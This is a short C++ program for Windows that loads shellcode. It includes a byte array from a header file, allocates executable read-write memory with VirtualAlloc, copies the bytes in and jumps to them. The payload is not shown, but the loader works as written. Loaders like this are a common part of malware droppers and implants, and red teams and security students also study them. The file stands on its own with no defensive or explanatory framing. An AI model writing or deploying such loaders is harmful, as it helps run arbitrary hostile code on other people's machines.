#include <Windows.h>
#include <iostream>

#include <shellcode.bin.h>

int main(int argc, char** argv)
{
    printf("[i] Trying to load shellcode...\n");

    void* exec = VirtualAlloc(nullptr, sizeof(shellcode_bin), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode_bin, sizeof(shellcode_bin));
    ((void(*)())exec)();
}
